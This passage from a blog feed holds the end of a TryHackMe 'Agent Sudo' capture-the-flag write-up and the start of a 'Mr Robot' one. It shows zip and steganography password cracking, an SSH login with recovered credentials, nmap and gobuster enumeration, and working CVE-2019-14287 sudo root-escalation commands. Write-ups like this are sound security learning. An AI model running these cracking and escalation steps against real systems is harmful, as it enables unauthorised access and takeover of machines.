</span></span><span class="line"><span class="cl"><span class="m">33143</span> bytes received in 00:00 <span class="o">(</span>154.69 KiB/s<span class="o">)</span>
</span></span><span class="line"><span class="cl">ftp&gt; get cutie.png
</span></span><span class="line"><span class="cl">local: cutie.png remote: cutie.png
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>63920<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> cutie.png <span class="o">(</span><span class="m">34842</span> bytes<span class="o">)</span>.
</span></span><span class="line"><span class="cl">100% <span class="p">|</span>************<span class="p">|</span> <span class="m">34842</span>      322.63 KiB/s    00:00 ETA
</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
</span></span><span class="line"><span class="cl"><span class="m">34842</span> bytes received in 00:00 <span class="o">(</span>158.37 KiB/s<span class="o">)</span>
</span></span><span class="line"><span class="cl">ftp&gt; quit
</span></span><span class="line"><span class="cl"><span class="m">221</span> Goodbye.
</span></span></code></pre></div><p>I should have used <code>mget *</code> here instead. Looking at the two images, I don&rsquo;t see anything immediately interesting. They are cute, though.</p>
<p>I spent a while viewing the files but don&rsquo;t get anywhere. So I consult the internet. Turns out the clever agents hid a text string inside a data file <a href="https://www.howtogeek.com/427805/how-to-use-the-strings-command-on-linux/">you can do this with binaries, too</a>. Apparently everyone on the internet uses <code>binwalk</code> for this scenario. <a href="https://www.kali.org/tools/binwalk/">Binwalk</a> is a tool for searching a given binary image for embedded files and executable code. Specifically, it is designed for identifying files and code embedded inside of firmware images. They must teach this stuff at spy school.</p>
<p>Let&rsquo;s binwalk&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ binwalk cutie.png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl"><span class="m">0</span>             0x0             PNG image, <span class="m">528</span> x 528, 8-bit colormap, non-interlaced
</span></span><span class="line"><span class="cl"><span class="m">869</span>           0x365           Zlib compressed data, best compression
</span></span><span class="line"><span class="cl"><span class="m">34562</span>         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
</span></span><span class="line"><span class="cl"><span class="m">34820</span>         0x8804          End of Zip archive, footer length: <span class="m">22</span>
</span></span></code></pre></div><p><code>binwalk</code>, in its omnipotence, has a function to extract known file types, using the <code>-e</code> flag.</p>
<p>We also now have the extracted contents of <code>cutie.png</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ls
</span></span><span class="line"><span class="cl"><span class="m">365</span>  365.zlib  8702.zip  To_agentR.txt
</span></span></code></pre></div><p>Let&rsquo;s unzip the archive:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ 7z x 8702.zip
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">7-Zip <span class="o">[</span>64<span class="o">]</span> 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
</span></span><span class="line"><span class="cl">p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>en_US.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,4 CPUs Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i7-7700K CPU @ 4.20GHz <span class="o">(</span>906E9<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Scanning the drive <span class="k">for</span> archives:
</span></span><span class="line"><span class="cl"><span class="m">1</span> file, <span class="m">280</span> bytes <span class="o">(</span><span class="m">1</span> KiB<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Extracting archive: 8702.zip
</span></span><span class="line"><span class="cl">--
</span></span><span class="line"><span class="cl"><span class="nv">Path</span> <span class="o">=</span> 8702.zip
</span></span><span class="line"><span class="cl"><span class="nv">Type</span> <span class="o">=</span> zip
</span></span><span class="line"><span class="cl">Physical <span class="nv">Size</span> <span class="o">=</span> <span class="m">280</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
</span></span><span class="line"><span class="cl">ERROR: Wrong password : To_agentR.txt
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">Sub items Errors: <span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Archives with Errors: <span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Sub items Errors: <span class="m">1</span>
</span></span></code></pre></div><p>Usually <code>zip</code> passwords are pretty easy to break in CTFs. Let&rsquo;s see if that&rsquo;s true here:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ zip2john 8702.zip &gt; 4john
</span></span><span class="line"><span class="cl">                                                                    
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ls
</span></span><span class="line"><span class="cl"><span class="m">365</span>  365.zlib  4john  8702.zip  To_agentR.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ john 4john
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>ZIP, WinZip <span class="o">[</span>PBKDF2-SHA1 256/256 AVX2 8x<span class="o">])</span>
</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>HMAC size<span class="o">)</span> is <span class="m">78</span> <span class="k">for</span> all loaded hashes
</span></span><span class="line"><span class="cl">Will run <span class="m">4</span> OpenMP threads
</span></span><span class="line"><span class="cl">Proceeding with single, rules:Single
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">Almost <span class="k">done</span>: Processing the remaining buffered candidate passwords, <span class="k">if</span> any.
</span></span><span class="line"><span class="cl">Proceeding with wordlist:/usr/share/john/password.lst
</span></span><span class="line"><span class="cl">----n            <span class="o">(</span>8702.zip/To_agentR.txt<span class="o">)</span>     
</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE 2/3 <span class="o">(</span>2022-05-23 11:42<span class="o">)</span> 1.587g/s 72174p/s 72174c/s 72174C/s 123456..ferrises
</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class="line"><span class="cl">Session completed. 
</span></span></code></pre></div><p>It is true. Now we can use <code>----n</code> to access the archive and read the contents of <code>To_agentR.txt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Agent C,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">We need to send the picture to &#39;-------x&#39; as soon as possible!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">By,
</span></span><span class="line"><span class="cl">Agent R
</span></span></code></pre></div><p>As the result of doing a few CTFs, the name of the picture recipient looks suspiciously like it is encoded in base64. As a reminder: <strong>base64 is not encryption</strong>. This is apparently a <a href="https://twitter.com/sempf/status/988525614444539904">big deal</a> <a href="https://github.com/sethvargo/base64-is-not-encryption">for kubernetes folks</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ touch -------x.txt
</span></span><span class="line"><span class="cl">                                                                    
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ vim -------x.txt
</span></span><span class="line"><span class="cl">                                                                    
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo/_cutie.png.extracted<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ base64 -d <span class="s1">&#39;-------x.txt&#39;</span>
</span></span><span class="line"><span class="cl">-----1   
</span></span></code></pre></div><p>Reading other write-ups after finishing the box, I learned about <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a> which looks great for stuff like this in the future.</p>
<p>The next prompt on THM asks for the <code>steg password</code>. I don&rsquo;t know what that is, so I search for it and <a href="https://www.kali.org/tools/stegcracker/">stegcracker</a> tops the list. Let&rsquo;s try it, in conjunction with our remaining alien image <code>cute-alien.jpg</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ stegcracker cute-alien.jpg
</span></span><span class="line"><span class="cl">StegCracker 2.1.0 - <span class="o">(</span>https://github.com/Paradoxis/StegCracker<span class="o">)</span>
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2022</span> - Luke Paris <span class="o">(</span>Paradoxis<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">StegCracker has been retired following the release of StegSeek, which 
</span></span><span class="line"><span class="cl"><span class="s2">&#34;steghidewill blast through the rockyou.txt wordlist within 1.9 second as opposed to StegCracker which takes ~5 hours.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">StegSeek can be found at: https://github.com/RickdeJager/stegseek
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">No wordlist was specified, using default rockyou.txt wordlist.
</span></span></span><span class="line"><span class="cl"><span class="s2">Counting lines in wordlist..
</span></span></span><span class="line"><span class="cl"><span class="s2">Attacking file &#39;cute-alien.jpg&#39; with wordlist &#39;/usr/share/wordlists/rockyou.txt&#39;..
</span></span></span></code></pre></div><p>Next time, I will definitely try <a href="https://github.com/RickdeJager/stegseek">StegSeek</a>! This is going insanely slowly, so I think it&rsquo;s probably not the right way to go. However, the ftp brute-force above took ages too. I&rsquo;ll let it run in the background while I google other steg stuff.</p>
<p>I learned about <a href="https://wiki.bi0s.in/steganography/stegsolve/">Stegsolve</a> which is a really cool little utility, but, sadly, not helpful here. The next thing to try is <a href="https://www.kali.org/tools/steghide/">steghide</a>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">                                                         
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ steghide --extract -sf cute-alien.jpg
</span></span><span class="line"><span class="cl">Enter passphrase: 
</span></span><span class="line"><span class="cl">wrote extracted data to <span class="s2">&#34;message.txt&#34;</span>.
</span></span><span class="line"><span class="cl">                                                         
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ cat message.txt
</span></span><span class="line"><span class="cl">Hi ----s,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Glad you find this message. Your login password is hackerrules!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Don<span class="err">&#39;</span>t ask me why the password look cheesy, ask agent R who <span class="nb">set</span> this password <span class="k">for</span> you.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Your buddy,
</span></span><span class="line"><span class="cl">----s
</span></span></code></pre></div><p>Coincidentally, the lethargic StegCracker process also just finished, giving us another route to the message.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ stegcracker cute-alien.jpg
</span></span><span class="line"><span class="cl">StegCracker 2.1.0 - <span class="o">(</span>https://github.com/Paradoxis/StegCracker<span class="o">)</span>
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2022</span> - Luke Paris <span class="o">(</span>Paradoxis<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">StegCracker has been retired following the release of StegSeek, which 
</span></span><span class="line"><span class="cl">will blast through the rockyou.txt wordlist within 1.9 second as opposed 
</span></span><span class="line"><span class="cl">to StegCracker which takes ~5 hours.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">StegSeek can be found at: https://github.com/RickdeJager/stegseek
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">No wordlist was specified, using default rockyou.txt wordlist.
</span></span><span class="line"><span class="cl">Counting lines in wordlist..
</span></span><span class="line"><span class="cl">Attacking file <span class="s1">&#39;cute-alien.jpg&#39;</span> with wordlist <span class="s1">&#39;/usr/share/wordlists/rockyou.txt&#39;</span>..
</span></span><span class="line"><span class="cl">Successfully cracked file with password: -----1doro1111
</span></span><span class="line"><span class="cl">Tried <span class="m">441203</span> passwords
</span></span><span class="line"><span class="cl">Your file has been written to: cute-alien.jpg.out
</span></span><span class="line"><span class="cl">-----1
</span></span><span class="line"><span class="cl">                                                         
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ cat cute-alien.jpg.out
</span></span><span class="line"><span class="cl">Hi ----s,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Glad you find this message. Your login password is hackerrules!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Don<span class="err">&#39;</span>t ask me why the password look cheesy, ask agent R who <span class="nb">set</span> this password <span class="k">for</span> you.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Your buddy,
</span></span><span class="line"><span class="cl">----s    
</span></span></code></pre></div><p>Let&rsquo;s log in via <code>ssh</code> and find our user flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ssh ----s@10.10.108.206
</span></span><span class="line"><span class="cl">----s@10.10.108.206<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-55-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System information as of Mon May <span class="m">23</span> 16:28:05 UTC <span class="m">2022</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:  1.07              Processes:           <span class="m">99</span>
</span></span><span class="line"><span class="cl">  Usage of /:   39.8% of 9.78GB   Users logged in:     <span class="m">0</span>
</span></span><span class="line"><span class="cl">  Memory usage: 19%               IP address <span class="k">for</span> eth0: 10.10.108.206
</span></span><span class="line"><span class="cl">  Swap usage:   0%
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">75</span> packages can be updated.
</span></span><span class="line"><span class="cl"><span class="m">33</span> updates are security updates.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Tue Oct <span class="m">29</span> 14:26:27 <span class="m">2019</span>
</span></span><span class="line"><span class="cl">----s@agent-sudo:~$ ls
</span></span><span class="line"><span class="cl">Alien_autospy.jpg  user_flag.txt
</span></span><span class="line"><span class="cl">----s@agent-sudo:~$ cat user_flag.txt
</span></span><span class="line"><span class="cl">🎌<span class="sb">`</span>user flag<span class="sb">`</span>🎌
</span></span><span class="line"><span class="cl">----s@agent-sudo:~$ 
</span></span></code></pre></div><p>While the secret agents certainly have more knowledge about image-based cryptography, I spot that they&rsquo;ve misspelled &ldquo;autopsy&rdquo; in the image file name, which, despite being a tiny victory helps my ego.</p>
<p>Now let&rsquo;s try to get root. First, I check to see what our friend <code>----s</code> has <code>sudo</code> permissions to run:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">----s@agent-sudo:~$ sudo -l
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> ----s: 
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> ----s on agent-sudo:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User ----s may run the following commands on agent-sudo:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL, !root<span class="o">)</span> /bin/bash
</span></span></code></pre></div><p>Well, that is lucky. I immediately google this command and discover CVE-2019-14287. This exploit works due to some remarkably simple logic. The security policy applied – which allows <code>----s</code> to run <code>bash</code> as any user except root – is quite sensible. However, unfortunately, <code>sudo</code> faithfully interprets <code>#-1</code> after the <code>-u</code> user flag and, upon checking for user number <code>-1</code>,  will run as user <code>0</code>: <code>root</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">----s@agent-sudo:~$ sudo -u#-1 bash
</span></span><span class="line"><span class="cl">root@agent-sudo:~# whoami
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>This can also be done with <code>4294967295</code> instead of <code>-u</code>. h/t <a href="https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/">WhiteSource</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">----s@agent-sudo:~$ sudo -u#4294967295 bash
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> ----s: 
</span></span><span class="line"><span class="cl">root@agent-sudo:~# whoami
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>Pretty crazy!</p>
<p>Now for the final spy message of the box:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@agent-sudo:/# <span class="nb">cd</span> /root
</span></span><span class="line"><span class="cl">root@agent-sudo:/root# ls
</span></span><span class="line"><span class="cl">root.txt
</span></span><span class="line"><span class="cl">root@agent-sudo:/root# cat root.txt
</span></span><span class="line"><span class="cl">To Mr.hacker,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Congratulation on rooting this box. This box was designed <span class="k">for</span> TryHackMe. Tips, always update your machine. 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Your flag is 
</span></span><span class="line"><span class="cl">🎌root flag🎌
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">By,
</span></span><span class="line"><span class="cl">-----l a.k.a Agent R
</span></span></code></pre></div><h3 id="notes">Notes</h3>
<p>I learned a lot from this box and enjoyed it a lot. In particular, I think building a familiarity with <code>binwalk</code> and the various tricks and utilities related to <a href="https://en.wikipedia.org/wiki/Steganography">steganography</a> - concealing data in other data or objects - will be useful down the road. Understanding and using CVE-2019-14287 was quite helpful, as well.</p>
]]></content>
        </item>
        
        <item>
            <title>THM: Mr Robot CTF -- Write-Up</title>
            <link>https://robscharf.github.io/posts/2022/05/thm-mr-robot-ctf--write-up/</link>
            <pubDate>Tue, 10 May 2022 23:14:00 +0000</pubDate>
            
            <guid>https://robscharf.github.io/posts/2022/05/thm-mr-robot-ctf--write-up/</guid>
            <description>About TryHackMe.com&amp;rsquo;s Mr Robot CTF (MRCTF) is a beginner-friendly capture-the-flag virtual machine by Leon Johnson. MRCTF is named after, and inspired by, the Mr. Robot television show and challenges users to capture three flags by finding vulnerabilities in the target server and exploiting them to gain root access.
Note I have replaced all instances of the virtual machine&amp;rsquo;s ip address with &amp;lt;target-ip&amp;gt; throughout this write-up.
Methodology We begin our enumeration efforts by running an nmap scan on the target machine to understand the ports that are open to network traffic.</description>
            <content type="html"><![CDATA[<h2 id="about">About</h2>
<p><a href="https://tryhackme.com/">TryHackMe.com</a>&rsquo;s <a href="https://tryhackme.com/room/mrrobot">Mr Robot CTF (MRCTF)</a> is a beginner-friendly capture-the-flag virtual machine by <a href="https://twitter.com/@sho_luv">Leon Johnson</a>. MRCTF is named after, and inspired by, the <a href="https://en.wikipedia.org/wiki/Mr._Robot">Mr. Robot</a> television show and challenges users to capture three flags by finding vulnerabilities in the target server and exploiting them to gain root access.</p>
<h3 id="note">Note</h3>
<p>I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
<h2 id="methodology">Methodology</h2>
<p>We begin our enumeration efforts by running an <code>nmap</code> scan on the target machine to understand the ports that are open to network traffic. I usually begin with the TCP SYN &ldquo;Stealth&rdquo; Scan (-sS) with &ldquo;version dection&rdquo; (<code>-V</code>) enabled. Here is a <a href="https://nmap.org/book/port-scanning-options.html">list of general <code>nmap</code> CLI flags</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap sudo nmap -sV -v &lt;target-ip&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-10 12:12 EDT
</span></span><span class="line"><span class="cl">NSE: Loaded <span class="m">45</span> scripts <span class="k">for</span> scanning.
</span></span><span class="line"><span class="cl">Initiating Ping Scan at 12:12
</span></span><span class="line"><span class="cl">Scanning &lt;target-ip&gt; <span class="o">[</span><span class="m">4</span> ports<span class="o">]</span>
</span></span><span class="line"><span class="cl">Completed Ping Scan at 12:12, 0.19s elapsed <span class="o">(</span><span class="m">1</span> total hosts<span class="o">)</span>
</span></span><span class="line"><span class="cl">Initiating Parallel DNS resolution of <span class="m">1</span> host. at 12:12
</span></span><span class="line"><span class="cl">Completed Parallel DNS resolution of <span class="m">1</span> host. at 12:12, 0.01s elapsed
</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 12:12
</span></span><span class="line"><span class="cl">Scanning &lt;target-ip&gt; <span class="o">[</span><span class="m">1000</span> ports<span class="o">]</span>
</span></span><span class="line"><span class="cl">Discovered open port 443/tcp on &lt;target-ip&gt;
</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on &lt;target-ip&gt;
</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 12:12, 9.83s elapsed <span class="o">(</span><span class="m">1000</span> total ports<span class="o">)</span>
</span></span><span class="line"><span class="cl">Initiating Service scan at 12:12
</span></span><span class="line"><span class="cl">Scanning <span class="m">2</span> services on &lt;target-ip&gt;
</span></span><span class="line"><span class="cl">Completed Service scan at 12:13, 12.92s elapsed <span class="o">(</span><span class="m">2</span> services on <span class="m">1</span> host<span class="o">)</span>
</span></span><span class="line"><span class="cl">NSE: Script scanning &lt;target-ip&gt;.
</span></span><span class="line"><span class="cl">Initiating NSE at 12:13
</span></span><span class="line"><span class="cl">Completed NSE at 12:13, 2.82s elapsed
</span></span><span class="line"><span class="cl">Initiating NSE at 12:13
</span></span><span class="line"><span class="cl">Completed NSE at 12:13, 1.27s elapsed
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> &lt;target-ip&gt;
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.15s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT    STATE  SERVICE  VERSION
</span></span><span class="line"><span class="cl">22/tcp  closed ssh
</span></span><span class="line"><span class="cl">80/tcp  open   http     Apache httpd
</span></span><span class="line"><span class="cl">443/tcp open   ssl/http Apache httpd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 27.44 seconds
</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">2007</span> <span class="o">(</span>88.284KB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">10</span> <span class="o">(</span>416B<span class="o">)</span>
</span></span></code></pre></div><p>From this, we learn that an <code>Apache</code> instance is active on the standard ports, while an ssh server is running on port 22 - though it is closed to network traffic.</p>
<p>Next, we use <code>gobuster</code>, <a href="https://github.com/OJ/gobuster">a popular tool</a> that facilitates brute-force enumeration. Here, we use it in directory mode (<code>dir</code>) with a popular directory names wordlist (<code>-w</code>) against our <code>&lt;target-ip&gt;</code> with (<code>-u</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gobuster dir -w /usr/share/wordlists/dirb/common.txt -u &lt;target-ip&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://&lt;target-ip&gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2022/05/10 12:13:27 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 213<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 218<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 218<span class="o">]</span>
</span></span><span class="line"><span class="cl">
